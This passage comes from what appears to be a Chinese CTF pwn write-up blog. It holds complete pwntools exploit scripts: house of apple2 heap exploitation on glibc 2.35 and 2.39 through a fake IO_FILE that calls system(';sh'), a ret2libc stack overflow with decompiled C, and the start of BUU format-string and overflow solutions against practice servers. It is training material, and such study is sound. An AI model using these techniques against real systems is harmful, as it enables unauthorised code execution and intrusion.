class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.35.so&#x27;</span>)  <span class="comment"># ubuntu22打本地</span></span><br><span class="line"></span><br><span class="line">one = [<span class="number">0xe6aee</span>, <span class="number">0xe6af1</span>, <span class="number">0xe6af4</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content=<span class="string">b&#x27;deafbeef&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x30</span>)  <span class="comment"># 0x20的话chunk2的地址是00结尾，printf没法泄露，所以要0x30</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x30</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x530</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">large = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))  <span class="comment"># 其实是main_arena+0x490</span></span><br><span class="line">libcbase = large - <span class="number">0x670</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">_IO_list_all = libcbase + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">io_wfile_jumps = libcbase + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;heap: &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(large) + p64(large) + p64(heap) + p64(_IO_list_all - <span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x550</span>)</span><br><span class="line">chunk_addr = heap - <span class="number">0x560</span>  <span class="comment"># chunk0的chunk地址</span></span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span> + p32(<span class="number">0xfffff7f5</span>) + <span class="string">b&#x27;;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_file = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(<span class="number">2</span>)</span><br><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    <span class="number">0xa0</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(chunk_addr + <span class="number">0x100</span>)  <span class="comment"># _wide_data</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    <span class="number">0xc0</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(<span class="number">0xffffffffffffffff</span>)  <span class="comment"># _mode</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    <span class="number">0xd8</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(io_wfile_jumps)  <span class="comment"># vtable</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    <span class="number">0x100</span> - <span class="number">0x10</span> + <span class="number">0xe0</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(chunk_addr + <span class="number">0x200</span>)</span><br><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    <span class="number">0x200</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(<span class="number">0</span>)*<span class="number">13</span> + p64(system)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, fake_io_file)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">exit()<span class="comment"># 触发abort()</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x06-2-39"><a href="#0x06-2-39" class="headerlink" title="0x06 2.39"></a>0x06 2.39</h3><h5 id="题目区别"><a href="#题目区别" class="headerlink" title="题目区别"></a>题目区别</h5><p>2.39的题目唯一的区别就是申请chunk的时候只能申请largechunk，题目描述说使用全新的IO打法，不出意外就是apple系列了。</p><h5 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h5><p>思路与上一题相同，使用house of apple2。区别就是保护chunk最小只能申请0x500，其他依然板子做题。</p><h5 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(choice).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;size? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content=<span class="string">b&#x27;deafbeef&#x27;</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x508</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x510</span>)  <span class="comment"># 小的chunk</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x500</span>)  <span class="comment"># 防止合并</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x520</span>)  <span class="comment"># 大的chunk</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x500</span>)  <span class="comment"># 防止合并</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x530</span>)  <span class="comment"># 将chunk2放进largebin中</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">large = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))  <span class="comment"># 其实是main_arena+0x490</span></span><br><span class="line">libcbase = large - <span class="number">0x670</span> - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">_IO_list_all = libcbase + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">io_wfile_jumps = libcbase + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&#x27;libcbase: &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">r.recv(<span class="number">0x10</span>)</span><br><span class="line">heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;heap: &#x27;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(large) + p64(large) + p64(heap) +</span><br><span class="line">     p64(_IO_list_all - <span class="number">0x20</span>))  <span class="comment"># 改chunk2的bk_nextsize</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x550</span>)  <span class="comment"># 将chunk0放进largebin中</span></span><br><span class="line">chunk_addr = heap - <span class="number">0xa30</span>  <span class="comment"># chunk0</span></span><br><span class="line">edit(<span class="number">8</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x500</span> + p32(<span class="number">0xfffff7f5</span>) + <span class="string">b&#x27;;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_io_file = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">1</span>) + p64(<span class="number">2</span>)</span><br><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    <span class="number">0xa0</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(chunk_addr + <span class="number">0x100</span>)  <span class="comment"># _wide_data</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    <span class="number">0xc0</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(<span class="number">0xffffffffffffffff</span>)  <span class="comment"># _mode</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    <span class="number">0xd8</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(io_wfile_jumps)  <span class="comment"># vtable</span></span><br><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    <span class="number">0x100</span> - <span class="number">0x10</span> + <span class="number">0xe0</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(chunk_addr + <span class="number">0x200</span>)</span><br><span class="line">fake_io_file = fake_io_file.ljust(</span><br><span class="line">    <span class="number">0x200</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\0&#x27;</span>) + p64(<span class="number">0</span>)*<span class="number">13</span> + p64(system)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, fake_io_file)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">exit()  <span class="comment"># 触发IO_cleanup</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x07-ATM"><a href="#0x07-ATM" class="headerlink" title="0x07 ATM"></a>0x07 ATM</h3><h5 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h5><p>这是一道栈题，简单的栈溢出。选项3可以直接加钱，选项5会给你一个printf的真实地址，并根据你现在的钱数作为读取字节数。需要注意的是这里存在一个数据类型转换的问题，nbytes原本是size_t类型的，但是read的时候是unsigned int，所以加钱的时候不一定是越大越好，可能直接给你回绕了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">app_fun</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v1[<span class="number">312</span>]; <span class="comment">// [rsp+0h] [rbp-160h] BYREF</span></span><br><span class="line">  <span class="type">char</span> nptr[<span class="number">8</span>]; <span class="comment">// [rsp+138h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>]; <span class="comment">// [rsp+140h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+150h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+154h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+158h] [rbp-8h]</span></span><br><span class="line">  <span class="type">size_t</span> nbytes; <span class="comment">// [rsp+15Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;password:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x10</span>uLL);</span><br><span class="line">  LODWORD(nbytes) = <span class="number">200</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    block();</span><br><span class="line">    read(<span class="number">0</span>, nptr, <span class="number">8uLL</span>);</span><br><span class="line">    v6 = atoi(nptr);</span><br><span class="line">    result = v6;</span><br><span class="line">    <span class="keyword">switch</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Your balance is:%d$\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please enter the money you withdraw:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(nptr, <span class="number">0</span>, <span class="keyword">sizeof</span>(nptr));</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">7uLL</span>);</span><br><span class="line">        v4 = atoi(nptr);</span><br><span class="line">        <span class="keyword">if</span> ( v4 &lt;= <span class="number">0</span> || v4 &gt; (<span class="type">int</span>)nbytes )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">        LODWORD(nbytes) = nbytes - v4;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Please enter your deposit:&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(nptr, <span class="number">0</span>, <span class="keyword">sizeof</span>(nptr));</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">7uLL</span>);</span><br><span class="line">        v5 = (<span class="type">unsigned</span> <span class="type">int</span>)nptr;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)nptr )</span><br><span class="line">          LODWORD(nbytes) = nbytes + v5;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">LABEL_10:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Invalid amount.&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;gift:%p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">        read(<span class="number">0</span>, v1, (<span class="type">unsigned</span> <span class="type">int</span>)nbytes);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>block函数是menu</p><p>加钱1000之后直接ret2libc即可，程序给了libc地址，甚至免去了泄露libc的步骤。附件没给libc，可以用LibcSearcher，但是我直接打本地所以用了本机2.35的libc。</p><h5 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;./app&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./app&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Exit&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;deposit:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;1000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Exit&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;gift:&#x27;</span>)</span><br><span class="line">printf_addr = <span class="built_in">int</span>(r.recv(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="built_in">hex</span>(printf_addr))</span><br><span class="line"></span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">rdi = <span class="number">0x401233</span></span><br><span class="line">ret = <span class="number">0x401234</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x168</span>+p64(rdi)+p64(binsh_addr)+p64(ret)+p64(system_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Exit&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
            <tag> heap </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『BUU』刷题记录（一）</title>
      <link href="/2024/buu-wp-1/"/>
      <url>/2024/buu-wp-1/</url>
      
        <content type="html"><![CDATA[<h3 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29513</span>)</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x804C044</span>: <span class="number">0</span>&#125;)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;your name:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = process(&#x27;./level2&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">25087</span>)</span><br><span class="line"></span><br><span class="line">sysplt_addr = <span class="number">0x8048320</span></span><br><span class="line">binsh_addr = <span class="number">0x804A024</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;dead&#x27;</span>+p32(sysplt_addr)+p32(binsh_addr)*<span class="number">3</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span 